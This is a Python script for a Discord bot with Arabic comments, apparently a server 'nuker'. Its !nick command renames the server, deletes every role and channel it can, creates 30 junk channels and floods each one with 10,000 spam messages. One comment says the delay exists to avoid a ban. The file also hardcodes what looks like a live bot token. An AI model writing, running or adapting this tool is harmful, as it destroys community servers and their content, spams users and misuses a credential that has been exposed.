import discord
from discord.ext import commands
import asyncio
import random

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot is online as {bot.user}")

@bot.command()
async def nick(ctx):
    guild = ctx.guild

    # 1. تغيير اسم السيرفر
    try:
        await guild.edit(name="MONI 7WWAYY")
    except Exception as e:
        print(f"❌ Failed to change server name: {e}")

    # 2. حذف كل الرولات ما عدا الرول الافتراضي ورول البوت
    for role in guild.roles:
        if role.managed or role >= guild.me.top_role or role == guild.default_role:
            continue
        try:
            await role.delete()
        except:
            pass

    await asyncio.sleep(1)

    # 3. إنشاء 10 رولات باسم MONI 7777WWWAAAYYY
    for _ in range(10):
        try:
            color = discord.Color(random.randint(0x000000, 0xFFFFFF))
            await guild.create_role(name="MONI 7777WWWAAAYYY", color=color)
        except:
            pass

    await asyncio.sleep(1)

    # 4. حذف كل القنوات (الأصلية)
    async def delete_channel(channel):
        try:
            await channel.delete()
        except:
            pass

    await asyncio.gather(*(delete_channel(c) for c in guild.channels))

    await asyncio.sleep(2)

    # 5. إنشاء 30 قناة جديدة
    channels = []
    for i in range(30):
        try:
            ch = await guild.create_text_channel(f"moni-7wak-{i+1}")
            channels.append(ch)
        except:
            pass

    await asyncio.sleep(2)

    # 6. إرسال 10,000 رسالة في كل قناة
    async def spam_channel(channel):
        for _ in range(10000):
            try:
                await channel.send("MONI 7WAY")
                await asyncio.sleep(0.01)  # لتفادي الحظر
            except:
                break

    await asyncio.gather(*(spam_channel(ch) for ch in channels))

# إبقاء البوت شغال دائمًا
while True:
    try:
        bot.run("MTM5OTc4NDA2NTcxMTg3MDEwMg.G0N5QK.SRHBRNFnZmJL08WCV4sWtqcVkAVKI6qbGiGQZc")  # ← ضع التوكن هنا
    except Exception as e:
        print(f"🔴 Error: {e}")
        asyncio.sleep(5)
